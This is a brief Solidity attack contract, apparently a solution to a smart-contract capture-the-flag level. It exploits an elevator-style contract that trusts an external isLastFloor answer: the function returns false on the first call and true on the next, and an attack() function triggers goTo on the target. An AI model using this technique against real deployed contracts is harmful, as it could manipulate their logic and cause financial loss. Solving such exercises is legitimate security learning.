```javascript
pragma solidity ^0.6.0;

contract Building {
    bool public first_call = true;
 
    function isLastFloor(uint) external returns (bool) {
        if(first_call == true) {
            first_call = false;
            return false;
        } else {
            return true;
        }
    }
 
    function attack(address addr, uint floor) public {
        (bool success, ) = addr.call(abi.encodeWithSignature("goTo(uint256)", floor));
        require(success);
    }
}
```

Simple enough.